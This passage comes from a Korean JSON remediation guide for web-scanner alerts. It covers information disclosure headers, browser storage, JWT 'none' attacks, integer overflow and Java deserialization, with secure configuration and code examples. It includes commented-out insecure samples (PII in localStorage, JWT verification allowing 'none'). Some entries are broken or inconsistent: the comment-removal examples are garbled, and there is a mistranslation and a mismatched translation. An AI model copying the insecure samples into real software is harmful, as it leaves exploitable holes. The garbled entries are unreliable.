      "**에러 로깅 시스템 사용:** 모든 SQL 오류는 서버 측에서 안전하게 로깅하고, 로깅된 정보는 관리자만 접근할 수 있도록 합니다. 로그 파일은 웹을 통해 접근 불가능한 위치에 저장합니다.",
      "**커스텀 에러 페이지 설정:** 애플리케이션 프레임워크 또는 웹 서버 설정을 통해 데이터베이스 오류 시 사용자에게 보여질 커스텀 에러 페이지를 설정합니다.",
      "**SQL Injection 방어 철저:** 상세 SQL 에러가 노출되는 것은 SQL Injection 공격 시도에 대한 응답일 수 있으므로, 애플리케이션의 모든 SQL Injection 취약점을 방어합니다. (Prepared Statements, 입력값 검증 등)"
    ],
    "example_java_jdbc_error_handling": "\n// Java JDBC 예시 (SQL 에러 처리)\ntry (PreparedStatement pstmt = connection.prepareStatement(sql)) {\n \t// ...\n} catch (SQLException e) {\n \t// 운영 환경에서는 상세한 에러를 클라이언트에게 노출하지 않음\n \tlogger.error(\"Database error occurred: {}\", e.getMessage(), e); // 서버 측 로깅\n \t// 클라이언트에게는 일반적인 메시지 반환\n \t// response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"An internal error occurred.\");\n \tthrow new RuntimeException(\"Database operation failed.\"); // 또는 사용자 친화적 예외\n}\n    "
  },
  "Information Disclosure - Sensitive Information in Browser Storage": {
    "translated": "정보 노출 - 브라우저 저장소 내 민감 정보 – 브라우저 저장소에 민감한 정보가 저장되어 노출됨",
    "description": "웹 애플리케이션이 브라우저의 Local Storage, Session Storage, IndexedDB 등에 민감한 정보(예: 개인 식별 정보, 세션 토큰, 사용자 설정 등)를 저장하여, XSS (Cross-Site Scripting) 공격이나 기타 클라이언트 측 공격에 의해 해당 정보가 탈취될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**브라우저 저장소에 민감 정보 저장 금지:** 개인 식별 정보(PII), 인증 토큰(특히 JWT), 세션 ID 등 민감한 정보는 Local Storage나 Session Storage에 직접 저장하지 않습니다.",
      "**HttpOnly 쿠키 사용:** 세션 ID나 인증 토큰 등 서버로 전송되어야 하는 민감한 정보는 `HttpOnly` 플래그가 설정된 쿠키에 저장하여 JavaScript를 통한 접근을 차단합니다.",
      "**데이터 암호화 또는 토큰화:** 불가피하게 클라이언트 측 저장소에 데이터를 저장해야 한다면, 저장하기 전에 강력한 암호화 알고리즘으로 암호화하거나, 토큰화된 형태로 저장합니다.",
      "**XSS 방어 철저:** 브라우저 저장소의 정보 탈취는 종종 XSS 공격을 통해 이루어지므로, 애플리케이션의 모든 XSS 취약점을 철저히 방어합니다.",
      "**저장 데이터 최소화:** 클라이언트 측 저장소에 저장되는 데이터의 양을 최소화하고, 필요한 정보만 저장하도록 합니다."
    ],
    "example_javascript_browser_storage_security": "\n// Insecure (vulnerable: storing sensitive data directly)\n// localStorage.setItem('user_details', JSON.stringify({ email: 'user@example.com', role: 'admin' }));\n\n// Secure (Avoid storing sensitive data in browser storage)\n// For authentication tokens, use HttpOnly cookies set by the server.\n// For non-sensitive data, ensure it's not PII and consider its lifetime.\n    "
  },
  "Information Disclosure - Sensitive Information in Browser localStorage": {
    "translated": "정보 노출 - 브라우저 localStorage 내 민감 정보 – 브라우저 localStorage에 민감한 정보가 저장되어 노출됨",
    "description": "브라우저의 Local Storage에 민감한 정보(예: 개인 식별 정보, 세션 토큰, 사용자 설정 등)가 저장되어, XSS (Cross-Site Scripting) 공격이나 기타 클라이언트 측 공격에 의해 해당 정보가 탈취될 수 있는 취약점입니다. Local Storage는 세션 종료 후에도 데이터가 유지됩니다.",
    "solution_guidelines": [
      "**Information Disclosure - Sensitive Information in Browser Storage** 취약점의 해결 가이드라인을 참조하십시오.",
      "Local Storage는 영구 저장소이므로, 민감 정보 저장을 더욱 강력히 지양해야 합니다."
    ]
  },
  "Information Disclosure - Sensitive Information in Browser sessionStorage": {
    "translated": "정보 노출 - 브라우저 sessionStorage 내 민감 정보 – 브라우저 sessionStorage에 민감한 정보가 저장되어 노출됨",
    "description": "브라우저의 Session Storage에 민감한 정보(예: 개인 식별 정보, 세션 토큰, 사용자 설정 등)가 저장되어, XSS (Cross-Site Scripting) 공격이나 기타 클라이언트 측 공격에 의해 해당 정보가 탈취될 수 있는 취약점입니다. Session Storage는 브라우저 탭/창이 닫히면 데이터가 사라집니다.",
    "solution_guidelines": [
      "**Information Disclosure - Sensitive Information in Browser Storage** 취약점의 해결 가이드라인을 참조하십시오.",
      "Session Storage는 Local Storage보다는 덜 위험하지만, 여전히 XSS 공격에 취약하므로 민감 정보 저장은 피해야 합니다."
    ]
  },
  "Information Disclosure - Sensitive Information in HTTP Referrer Header": {
    "translated": "정보 노출 - HTTP Referer 헤더 내 민감 정보 – HTTP Referer 헤더에 URL 파라미터 등을 통해 민감한 정보가 포함되어 노출됨",
    "description": "HTTP `Referer` (또는 `Referer-Policy`) 헤더에 URL 쿼리 파라미터나 경로를 통해 민감한 정보(예: 세션 ID, 토큰, 사용자 ID, 검색어)가 포함되어 다른 웹사이트로 전송될 때 발생하는 취약점입니다. 이는 로그, 분석 도구, 또는 악의적인 웹사이트에 민감한 정보를 노출할 수 있습니다.",
    "solution_guidelines": [
      "**Referrer-Policy 헤더 설정:** `Referrer-Policy` HTTP 헤더를 설정하여 `Referer` 정보의 전송 정책을 제어합니다. 권장되는 값은 `no-referrer`, `no-referrer-when-downgrade`, `same-origin`, `strict-origin-when-cross-origin` 등입니다.",
      "**URL에 민감 정보 포함 금지:** 세션 ID, 인증 토큰, 개인 식별 정보 등 민감한 데이터는 절대로 URL 쿼리 파라미터나 경로에 포함해서는 안 됩니다. 대신 POST 요청 바디, HTTP 헤더, 또는 쿠키(HttpOnly)를 사용합니다.",
      "**HTTPS로만 통신:** 모든 웹사이트 통신을 HTTPS로 강제하여, 적어도 HTTPS에서 HTTP로의 다운그레이드 시 `Referer` 정보가 누출되는 것을 방지합니다.",
      "**검색 엔진 최적화(SEO) 및 분석 도구 설정 검토:** `Referer` 정보를 수집하는 모든 외부 서비스(분석 도구, 광고 네트워크 등)의 설정을 검토하여 민감 정보가 수집되지 않도록 합니다."
    ],
    "example_nginx_referrer_policy": "\n# Nginx Referrer-Policy 헤더 설정 예시\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\"; # 교차 출처 요청 시 출처만 전송\n# 또는\n# add_header Referrer-Policy \"same-origin\"; # 동일 출처 요청 시에만 Referer 전송\n    "
  },
  "Information Disclosure - Sensitive Information in URL": {
    "translated": "정보 노출 - URL 내 민감 정보 – URL 자체에 사용자 이름, 비밀번호, 세션 ID 등 민감한 정보가 포함되어 노출됨",
    "description": "URL의 쿼리 파라미터 또는 경로에 민감한 정보(예: 사용자 이름, 비밀번호, 세션 ID, 인증 토큰, 개인 식별 정보, 금융 정보)가 포함되어 노출되는 심각한 취약점입니다. URL은 브라우저 히스토리, 웹 서버 로그, 프록시 캐시, 리퍼러 헤더 등에 기록되어 쉽게 탈취될 수 있습니다.",
    "solution_guidelines": [
      "**URL에 민감 정보 포함 금지:** 개인 식별 정보(PII), 인증 자격 증명, 세션 토큰, 금융 정보 등 어떠한 민감한 데이터도 URL 쿼리 파라미터나 경로에 포함해서는 안 됩니다.",
      "**POST 요청 바디, HTTP 헤더, HttpOnly 쿠키 사용:** 민감한 정보는 반드시 HTTP POST 요청의 바디, 보안 HTTP 헤더(예: `Authorization`), 또는 `HttpOnly` 및 `Secure` 플래그가 설정된 쿠키를 통해 전송합니다.",
      "**HTTPS (TLS) 강제 적용:** 모든 웹사이트 통신은 반드시 HTTPS(TLS)를 통해 암호화되어야 합니다.",
      "**로그 및 캐시 검토:** 웹 서버, 프록시 서버, 로드 밸런서의 로그 설정 및 브라우저 캐시 설정을 검토하여 URL에 포함된 민감 정보가 기록되지 않도록 합니다.",
      "**자동 로그인/아이디 저장 기능 구현 시 주의:** 이러한 기능은 클라이언트 측에 민감 정보를 저장하게 되므로, 안전한 암호화 및 저장 메커니즘을 사용하고 사용자에게 위험을 고지합니다."
    ],
    "example_general_url_security": "\n# URL 보안 가이드라인\n# 1. URL에 민감 정보 (비밀번호, 토큰, PII) 포함 금지\n# 2. 민감 정보는 POST 바디, Secure/HttpOnly 쿠키, Authorization 헤더 사용\n# 3. 모든 통신에 HTTPS/TLS 강제 적용\n# 4. 웹/프록시 서버 로그 설정 검토\n    "
  },
  "Information Disclosure - Server Header": {
    "translated": "정보 노출 - Server 헤더 – HTTP Server 헤더를 통해 웹 서버의 종류와 버전 정보가 노출됨",
    "description": "HTTP 응답 헤더의 `Server` 필드에 웹 서버의 종류와 버전 정보가 노출되는 취약점입니다. 이는 공격자가 특정 버전의 서버 소프트웨어에 알려진 취약점을 검색하고 공격을 시도하는 데 도움을 줄 수 있는 정보성 알림입니다.",
    "solution_guidelines": [
      "**`Server` 헤더 제거 또는 일반화:** 웹 서버(Apache, Nginx, IIS)의 설정을 변경하여 `Server` 헤더를 응답에 포함하지 않도록 하거나, 일반적인 값(예: `Server: Web Server`)으로 변경합니다.",
      "**리버스 프록시/로드 밸런서 사용:** 웹 서버 앞에 리버스 프록시(예: Nginx, Cloudflare)나 로드 밸런서를 두어 실제 백엔드 서버의 정보를 숨깁니다. 프록시 자체의 `Server` 헤더도 제거하거나 일반화하는 것이 좋습니다.",
      "**불필요한 정보 노출 방지:** `Server` 헤더 외에도 `X-Powered-By`, `X-AspNet-Version` 등 서버/프레임워크 정보를 노출하는 다른 헤더들도 함께 제거하거나 일반화합니다."
    ],
    "example_nginx_server_tokens": "\n# Nginx 설정 예시 (Server 헤더 버전 정보 숨기기)\nserver {\n \t# ...\n \tserver_tokens off; # Server 헤더에서 Nginx 버전 정보 제거\n \t# ...\n}\n    ",
    "example_apache_server_tokens": "\n# Apache httpd.conf 설정 예시\nServerTokens Prod # Server 헤더에 'Apache'만 표시 (버전 제거)\n# ServerTokens Full # (기본값) 모든 정보 표시 (취약)\n# ServerTokens OS # OS 정보 포함\n# ServerTokens Minimal # Apache 버전만 표시\n    "
  },
  "Information Disclosure - Suspicious Comments": {
    "translated": "정보 노출 - 의심스러운 주석 – 코드 내 의심스러운 주석(개발자 코멘트 등)이 발견됨",
    "description": "웹 페이지의 HTML, JavaScript, CSS 주석 내에 'TODO', 'FIXME', 'DEBUG', 'temp' 등 개발자가 사용한 의심스러운 코멘트가 포함되어 노출되는 취약점입니다. 이러한 코멘트에는 내부 시스템 구조, 미완성 기능, 잠재적 버그에 대한 힌트 등 민감한 정보가 포함될 수 있습니다.",
    "solution_guidelines": [
      "**운영 환경 배포 전 모든 주석 검토 및 제거:** 운영 환경에 배포하기 전에 모든 HTML, JavaScript, CSS 주석을 검토하여 민감한 정보나 불필요한 개발자 노트가 포함되어 있지 않은지 확인하고 제거합니다.",
      "**서버 측 주석 활용:** 민감한 정보나 개발자 노트는 클라이언트에게 노출되지 않는 서버 측 스크립트(예: JSP, PHP, ASP.NET)의 주석으로만 사용합니다.",
      "**코드 민영화(Minification) 및 난독화:** 배포 시 JavaScript 및 CSS 파일을 민영화(Minify)하여 불필요한 공백과 주석을 제거하고, 필요하다면 난독화(Obfuscation)를 적용하여 코드 분석을 어렵게 합니다.",
      "**정보 공개 최소화 원칙:** 웹 페이지에 필요한 최소한의 정보만 포함하고, 내부 시스템에 대한 어떠한 힌트도 제공하지 않도록 합니다."
    ],
    "example_html_comment_cleanup": "\n-->\n\n<nav>...</nav>\n-->\n    "
  },
  "Information Disclosure - Suspicious Comments in XML via WebSocket": {
    "translated": "정보 노출 - 웹소켓을 통한 XML 내 의심스러운 주석 – 웹소켓 통신 XML 데이터 안에 의심스러운 주석이 발견됨",
    "description": "WebSocket 메시지를 통해 전송되는 XML 데이터 내에 개발자 주석이 포함되어 노출되는 취약점입니다. 이 주석에는 민감한 내부 정보(예: 내부 데이터 구조, 개발자 노트, 잠재적 버그 힌트)가 포함되어 공격자에게 시스템 정보를 제공할 수 있습니다.",
    "solution_guidelines": [
      "**WebSocket 통신에 HTTPS(WSS) 사용:** 모든 WebSocket 통신은 반드시 `wss://` 프로토콜을 사용하여 암호화된 채널을 통해 이루어져야 합니다.",
      "**XML 데이터에서 주석 제거:** 운영 환경으로 전송되는 XML 데이터에서 개발자 주석()을 모두 제거합니다. XML 파싱 시 주석은 일반적으로 무시되지만, 정보 유출의 위험이 있습니다.",
      "**민감 정보는 XML 주석에 포함 금지:** 개발 중이더라도 XML 주석에 민감한 정보(예: 자격 증명, SQL 쿼리, PII)를 포함하지 않습니다.",
      "**XML 유효성 검사:** 서버 측에서 수신하는 XML 데이터에 대해 엄격한 스키마 유효성 검사를 수행하여 비정상적인 구조나 콘텐츠를 차단합니다."
    ],
    "example_xml_comment_removal": "\n<message>Hello</message></data> -->\n\n<data><user_id>123</user_id><message>Hello</message></data>\n    "
  },
  "Information Disclosure - X-Powered-By Header": {
    "translated": "정보 노출 - X-Powered-By 헤더 – X-Powered-By 헤더를 통해 사용 중인 웹 기술 스택(ASP.NET, PHP 등)이 노출됨",
    "description": "HTTP 응답 헤더의 `X-Powered-By` 필드에 사용된 웹 기술(예: PHP, ASP.NET, Express) 및 버전 정보가 노출되는 취약점입니다. 이는 공격자가 해당 기술 스택에 알려진 취약점을 검색하고 공격을 시도하는 데 도움을 줄 수 있는 정보성 알림입니다.",
    "solution_guidelines": [
      "**`X-Powered-By` 헤더 제거:** 웹 서버(Apache, Nginx, IIS) 또는 애플리케이션 프레임워크(PHP, ASP.NET, Node.js Express 등)의 설정을 변경하여 `X-Powered-By` 헤더가 응답에 포함되지 않도록 합니다.",
      "**불필요한 정보 노출 방지:** `Server` 헤더 등 다른 시스템 정보 노출 헤더도 함께 제거하거나 일반화하는 것을 권장합니다.",
      "**보안 헤더 추가:** `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security` 등과 같은 보안 관련 HTTP 헤더를 추가하여 전반적인 보안을 강화합니다."
    ],
    "example_php_hide_powered_by": "\n# PHP.ini 설정 예시 (X-Powered-By 헤더 숨기기)\n# expose_php = Off\n\n# Nginx 설정 예시 (PHP-FPM 사용 시)\n# fastcgi_hide_header X-Powered-By;\n\n# Apache 설정 예시 (mod_headers 모듈 필요)\n# Header unset X-Powered-By\n    ",
    "example_nodejs_express_hide_powered_by": "\n// Node.js Express 예시 (X-Powered-By 헤더 숨기기)\nconst express = require('express');\nconst app = express();\napp.disable('x-powered-by'); // X-Powered-By 헤더 비활성화\n// ...\n    "
  },
  "Insecure Component": {
    "translated": "안전하지 않은 컴포넌트 – 알려진 취약점을 가진 라이브러리, 프레임워크 또는 기타 컴포넌트가 사용됨",
    "description": "웹 애플리케이션에서 오래되거나 알려진 취약점이 있는 서드파티 라이브러리, 프레임워크, CMS, 또는 기타 컴포넌트를 사용하고 있음을 나타내는 광범위한 취약점 유형입니다. 공격자는 이러한 취약점을 악용하여 시스템을 침해할 수 있습니다.",
    "solution_guidelines": [
      "**모든 컴포넌트 최신 버전 유지:** 운영 중인 모든 서드파티 라이브러리, 프레임워크, CMS, 웹 서버, 데이터베이스 등을 최신 안정 버전으로 업데이트합니다. 업데이트에는 알려진 보안 취약점에 대한 패치가 포함되어 있습니다.",
      "**사용하지 않는 컴포넌트 제거:** 불필요하거나 더 이상 사용하지 않는 컴포넌트는 즉시 시스템에서 제거하여 공격 표면을 줄입니다.",
      "**취약점 데이터베이스 확인:** OWASP Top 10, CVE(Common Vulnerabilities and Exposures), NVD(National Vulnerability Database) 등 공개된 취약점 데이터베이스를 주기적으로 확인하여 사용 중인 컴포넌트에 새로운 취약점이 보고되었는지 확인합니다.",
      "**컴포넌트 인벤토리 관리:** 애플리케이션이 사용하는 모든 컴포넌트(직접 및 간접 종속성 포함)에 대한 목록을 유지하고, 각 컴포넌트의 버전 및 라이선스 정보를 관리합니다.",
      "**보안 감사 및 모의 해킹:** 자동화된 도구만으로는 발견하기 어려운 컴포넌트 관련 취약점을 위해 전문가의 보안 감사 및 모의 해킹을 병행합니다."
    ],
    "example_general_component_management": "\n# Insecure Component 해결 가이드라인\n# 1. 모든 서드파티 컴포넌트의 최신 안정 버전 유지\n# 2. 불필요한 컴포넌트 제거\n# 3. CVE/NVD 등 취약점 데이터베이스 주기적 확인\n# 4. 컴포넌트 인벤토리 관리 및 종속성 스캐닝\n# 5. 전문가 보안 감사 병행\n    "
  },
  "Insecure HTTP Method": {
    "translated": "안전하지 않은 HTTP 메서드 – PUT, DELETE 등 위험한 HTTP 메서드가 부적절하게 활성화됨",
    "description": "웹 서버가 안전하지 않은 HTTP 메서드(예: TRACE, TRACK)를 허용하여, XST(Cross-Site Tracing) 공격과 같은 정보 유출 취약점에 노출될 수 있습니다.",
    "solution_guidelines": [
      "**안전하지 않은 HTTP 메서드 비활성화:** 웹 서버 설정(Apache, Nginx, IIS 등)에서 TRACE, TRACK과 같은 메서드를 명시적으로 비활성화합니다.",
      "**필요한 메서드만 허용:** 애플리케이션에 필요한 GET, POST 등 필수적인 HTTP 메서드만 허용하고 나머지는 차단합니다.",
      "**X-Content-Type-Options: nosniff 헤더 사용:** MIME 타입 스니핑 공격을 방지하여 추가적인 보안 계층을 제공합니다."
    ],
    "example_nginx": "\n# Nginx 설정 예시: TRACE 메서드 비활성화\nserver {\n \t# ...\n \tif ($request_method ~ ^(TRACE|TRACK)$) {\n \t\treturn 405;\n \t}\n \t# ...\n}\n    ",
    "example_apache": "\n# Apache httpd.conf 또는 .htaccess 예시: TRACE 메서드 비활성화\nTraceEnable Off\n    "
  },
  "Insecure JSF ViewState": {
    "translated": "안전하지 않은 JSF ViewState – JavaServer Faces(JSF)의 ViewState가 안전하지 않게 구성되어 변조나 정보 유출에 취약함",
    "description": "JSF(JavaServer Faces) ViewState가 적절히 암호화되거나 서명되지 않아, 데이터가 노출되거나 변조될 위험이 있습니다.",
    "solution_guidelines": [
      "**JSF ViewState 암호화 및 무결성 보호 활성화:** `web.xml` 또는 JSF 설정에서 `com.sun.faces.serializeViewState` 및 `com.sun.faces.clientStateSavingPassword`와 같은 설정을 통해 ViewState의 암호화와 무결성 보호를 활성화합니다.",
      "**ViewState에 민감 정보 저장 금지:** ViewState에는 세션 ID, 비밀번호 등 민감한 정보를 저장하지 않습니다.",
      "**ViewState의 크기 최소화:** ViewState의 크기를 줄여 클라이언트 전송량을 줄이고, 필요한 최소한의 데이터만 저장하도록 합니다.",
      "**서버 측 상태 저장 사용 고려:** 클라이언트 측 ViewState 대신 서버 측 상태 저장을 사용하여 민감 정보를 서버에 보관합니다."
    ],
    "example_jsf_config": "\n<context-param>\n \t<param-name>javax.faces.STATE_SAVING_METHOD</param-name>\n \t<param-value>client</param-value> </context-param>\n<context-param>\n \t<param-name>com.sun.faces.serializeViewState</param-name>\n \t<param-value>true</param-value> </context-param>\n<context-param>\n \t<param-name>com.sun.faces.clientStateSavingPassword</param-name>\n \t<param-value>YOUR_SECURE_PASSWORD</param-value> </context-param>\n    "
  },
  "Insufficient Site Isolation Against Spectre Vulnerability": {
    "translated": "스펙터 취약점에 대한 불충분한 사이트 격리 – 스펙터(Spectre)와 같은 CPU 취약점에 대한 방어가 미흡하여 사이트 간 정보 유출이 발생할 수 있음",
    "description": "Spectre와 같은 사이드 채널 공격에 대해 웹사이트가 충분히 격리되지 않아, 공격자가 브라우저 캐시 등을 통해 민감한 정보를 유추할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**Cross-Origin-Opener-Policy (COOP) 헤더 사용:** `Cross-Origin-Opener-Policy: same-origin` 헤더를 사용하여 현재 문서를 팝업이나 새 창으로 열었을 때, 오프너와의 브라우징 컨텍스트를 격리하여 Spectre와 같은 공격을 완화합니다.",
      "**Cross-Origin-Embedder-Policy (COEP) 헤더 사용:** `Cross-Origin-Embedder-Policy: require-corp` 또는 `credentialless` 헤더를 사용하여 교차 출처 리소스가 명시적인 CORS 또는 CORP 헤더 없이 로드되는 것을 방지합니다.",
      "**민감 데이터 전송 최소화:** 웹 애플리케이션에서 민감한 데이터를 전송하거나 처리하는 방식을 재검토하여 불필요한 노출을 최소화합니다."
    ],
    "example_headers": "\n# 웹 서버 설정 (Nginx 예시)\nadd_header Cross-Origin-Opener-Policy \"same-origin\";\nadd_header Cross-Origin-Embedder-Policy \"require-corp\";\n    "
  },
  "Integer Overflow Error": {
    "translated": "정수 오버플로우 오류 – 정수형 변수가 저장할 수 있는 최대값을 초과하여 예상치 못한 동작이나 보안 취약점(버퍼 오버플로우 등)을 유발할 수 있음",
    "description": "정수형 변수가 표현할 수 있는 최대값을 초과하여 예상치 못한 동작(예: 음수 값으로 변환)을 유발하거나, 메모리 할당 오류, 버퍼 오버플로우 등으로 이어질 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**입력값 유효성 검사:** 사용자 입력이나 시스템에서 계산되는 모든 정수 값을 검증하여 허용된 범위 내에 있는지 확인합니다.",
      "**적절한 데이터 타입 사용:** 사용될 값의 범위를 고려하여 충분히 큰 정수형 데이터 타입을 사용합니다. (예: `int` 대신 `long` 또는 `BigInteger` 사용)",
      "**오버플로우/언더플로우 검사:** 중요한 연산 전후에 오버플로우나 언더플로우가 발생할 수 있는지 명시적으로 검사하는 로직을 추가합니다.",
      "**언어별 안전한 API 사용:** 일부 언어는 오버플로우를 자동으로 처리하거나 경고를 발생시키는 기능을 제공합니다."
    ],
    "example_java": "\npublic class IntegerOverflowExample {\n \tpublic int addWithOverflowCheck(int a, int b) {\n \t\tif (a > 0 && b > 0 && a > Integer.MAX_VALUE - b) {\n \t\t\tthrow new ArithmeticException(\"Integer overflow occurred during addition.\");\n \t\t}\n \t\tif (a < 0 && b < 0 && a < Integer.MIN_VALUE - b) {\n \t\t\tthrow new ArithmeticException(\"Integer underflow occurred during addition.\");\n \t\t}\n \t\treturn a + b;\n \t}\n\n \tpublic static void main(String[] args) {\n \t\tIntegerOverflowExample example = new IntegerOverflowExample();\n \t\ttry {\n \t\t\tSystem.out.println(example.addWithOverflowCheck(Integer.MAX_VALUE, 1));\n \t\t} catch (ArithmeticException e) {\n \t\t\tSystem.out.println(e.getMessage()); // Integer overflow occurred during addition.\n \t\t}\n \t}\n}\n    ",
    "example_python": "\n# Python의 정수형은 자동으로 큰 값을 처리하므로 직접적인 오버플로우는 드뭅니다.\n# 하지만 특정 라이브러리나 C/C++ 바인딩 시 주의해야 합니다.\n# 일반적인 로직에서 범위를 제한해야 할 경우 예시:\ndef add_with_limit(a, b, max_value=2**31 - 1):\n \tresult = a + b\n \tif result > max_value:\n \t\traise ValueError(\"Result exceeds maximum allowed value.\")\n \treturn result\n\ntry:\n \tprint(add_with_limit(2**31 - 2, 1))\n \tprint(add_with_limit(2**31 - 1, 1)) # Raises ValueError\nexcept ValueError as e:\n \tprint(e)\n    "
  },
  "JWT None Exploit": {
    "translated": "JWT None 익스플로잇 – JWT(JSON Web Token)의 'alg' 헤더를 'None'으로 조작하여 서명 검증을 우회하고 토큰을 위조하는 공격",
    "description": "JWT(JSON Web Token)의 `alg` 헤더를 `none`으로 설정하여 서명 검증을 우회하고 토큰 내용을 조작할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`alg` 헤더 검증:** JWT 라이브러리가 토큰을 검증할 때 `alg` 헤더의 값이 예상되는 암호화 알고리즘(예: HS256, RS256)인지 확인하고, `none` 알고리즘은 절대 허용하지 않도록 명시적으로 설정합니다.",
      "**안전한 JWT 라이브러리 사용:** `none` 알고리즘을 기본적으로 지원하지 않거나, 해당 설정을 엄격하게 관리하는 검증된 JWT 라이브러리를 사용합니다.",
      "**토큰 발급 시 항상 서명 적용:** `none` 알고리즘으로 토큰을 발급하지 않도록 주의합니다."
    ],
    "example_nodejs_jsonwebtoken": "\nconst jwt = require('jsonwebtoken');\n\n// 안전하지 않은 예시 (none 알고리즘 허용 가능성)\n// try {\n// \tconst decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); // 'none'을 포함하면 위험!\n// \tconsole.log(decoded);\n// } catch (err) {\n// \tconsole.error(err);\n// }\n\n// 안전한 예시 (none 알고리즘 명시적 제거)\ntry {\n \tconst decoded = jwt.verify(token, 'your_secret_key', { algorithms: ['HS256', 'RS256'] }); // 'none'을 제외\n \tconsole.log(decoded);\n} catch (err) {\n \tconsole.error(\"JWT Verification failed:\", err.message);\n}\n    ",
    "example_python_jwt": "\nimport jwt\n\n# 안전하지 않은 예시 (alg='none'으로 토큰 생성 및 검증 시도)\n# token = jwt.encode({\"some\": \"payload\"}, key=None, algorithm=\"none\")\n# try:\n# \tdecoded = jwt.decode(token, algorithms=[\"none\"]) # 위험!\n# except Exception as e:\n# \tprint(f\"Error: {e}\")\n\n# 안전한 예시 (alg='none'을 허용하지 않음)\nsecret = \"your-very-secure-secret-key\"\nencoded_jwt = jwt.encode({\"user\": \"test\"}, secret, algorithm=\"HS256\")\n\ntry:\n \tdecoded = jwt.decode(encoded_jwt, secret, algorithms=[\"HS256\"]) # 'none'을 허용하지 않음\n \tprint(decoded)\nexcept jwt.exceptions.InvalidAlgorithmError:\n \tprint(\"Invalid algorithm detected.\")\nexcept jwt.exceptions.InvalidSignatureError:\n \tprint(\"Invalid signature detected.\")\nexcept Exception as e:\n \tprint(f\"An unexpected error occurred: {e}\")\n    "
  },
  "JWT Scan Rule": {
    "translated": "JWT 스캔 규칙 – JWT(JSON Web Token) 관련 취약점을 스캔하는 규칙이 적용됨",
    "description": "일반적인 JWT 관련 취약점(예: 서명 우회, 약한 키 사용, 정보 노출)을 스캔합니다. 이는 특정 취약점이 아닌 JWT 구현 전반의 문제점을 포괄합니다.",
    "solution_guidelines": [
      "**강력한 서명 알고리즘 사용:** SHA256 이상(예: HS256, RS256, ES256)의 강력한 서명 알고리즘을 사용하고, MD5와 같은 약한 알고리즘은 피합니다.",
      "**안전하고 충분히 긴 키 사용:** 예측하기 어렵고 충분히 긴 비밀 키를 사용하여 무단 서명 생성을 방지합니다.",
      "**민감 정보 페이로드에 포함 금지:** 사용자 ID, 역할 등 비민감 정보만 페이로드에 포함하고, 비밀번호, PII(개인 식별 정보) 등 민감 정보는 저장하지 않습니다.",
      "**짧은 만료 시간 설정:** JWT의 만료 시간을 짧게 설정하여 토큰 탈취 시 공격자가 악용할 수 있는 시간을 최소화합니다.",
      "**토큰 폐기 메커니즘 구현:** 로그아웃, 비밀번호 변경 시 토큰을 무효화하는 블랙리스트 또는 레보케이션(revocation) 목록을 구현합니다.",
      "**모든 JWT 검증:** 수신된 모든 JWT에 대해 서명, 만료 시간, 발급자, 대상 등 모든 클레임을 철저히 검증합니다."
    ],
    "example_general": "\n# 개발 가이드라인:\n# 1. JWT 발급 시에는 항상 강력한 비밀 키와 알고리즘을 사용합니다.\n# 2. JWT 페이로드에는 비민감 정보만 포함합니다.\n# 3. JWT 만료 시간을 짧게 설정하고, Refresh Token 전략을 고려합니다.\n# 4. 수신된 JWT는 서명 검증, 만료 시간, 'nbf'(Not Before) 클레임 등을 포함한 모든 필수 클레임을 검증합니다.\n# 5. JWT를 저장할 때는 XSS로부터 안전한 LocalStorage/SessionStorage 대신 HttpOnly 쿠키 사용을 고려합니다.\n    "
  },
  "Java Serialization Object": {
    "translated": "Java 직렬화 객체 – Java 직렬화된 객체가 웹 애플리케이션에 노출되거나 사용되어 역직렬화 취약점을 통해 원격 코드 실행이 가능할 수 있음",
    "description": "안전하지 않은 Java 객체 역직렬화(deserialization)는 RCE(원격 코드 실행)를 포함한 다양한 공격에 노출될 수 있는 심각한 취약점입니다.",
    "solution_guidelines": [
      "**신뢰할 수 없는 데이터 역직렬화 금지:** 신뢰할 수 없는 소스(예: 사용자 입력, 네트워크 요청)로부터 받은 데이터를 역직렬화하지 않습니다.",
      "**안전한 대안 사용:** JSON, XML, Protobuf 등 데이터 교환을 위한 안전한 표준 형식을 사용합니다. 이는 역직렬화 공격 위험을 크게 줄여줍니다.",
      "**역직렬화 필터링/화이트리스트:** 필요한 클래스만 역직렬화되도록 허용하는 필터링 메커니즘을 구현합니다. Java 9부터는 `ObjectInputFilter`를 사용하여 역직렬화를 제한할 수 있습니다.",
      "**JDK 최신 버전 사용:** 역직렬화 취약점에 대한 패치가 적용된 최신 JDK 버전을 사용합니다."
    ],
    "example_java_serialization_filter": "\n// Java 9+ ObjectInputFilter 예시 (JVM 시작 옵션 또는 프로그램 내에서 설정)\n// JVM 시작 옵션: -Djdk.serialFilter=!evil.Gadget;java.lang.String\n// 프로그램 내 설정:\nimport java.io.ObjectInputFilter;\nimport java.io.ObjectInputStream;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\n\npublic class SerializationFilterExample {\n\n \tstatic class MyObject implements Serializable {\n \t\tString data;\n \t\tMyObject(String data) { this.data = data; }\n \t\t@Override\n \t\tpublic String toString() { return \"MyObject{\" + \"data='\" + data + \"'}\"; }\n \t}\n\n \tpublic static void main(String[] args) throws Exception {\n \t\t// Serialization\n \t\tByteArrayOutputStream baos = new ByteArrayOutputStream();\n \t\tObjectOutputStream oos = new ObjectOutputStream(baos);\n \t\toos.writeObject(new MyObject(\"Hello Secure World\"));\n \t\tbyte[] serializedData = baos.toByteArray();\n\n \t\t// Deserialization with filter\n \t\tByteArrayInputStream bais = new ByteArrayInputStream(serializedData);\n \t\tObjectInputStream ois = new ObjectInputStream(bais);\n\n \t\t// Define a filter: only allow MyObject and String\n \t\tObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\n \t\t\t\"com.example.SerializationFilterExample$MyObject;java.lang.String;!*\"); // Allows MyObject and String, disallows everything else\n\n \t\tois.setObjectInputFilter(filter);\n\n \t\ttry {\n \t\t\tMyObject obj = (MyObject) ois.readObject();\n \t\t\tSystem.out.println(\"Deserialized: \" + obj);\n \t\t} catch (java.io.InvalidClassException e) {\n 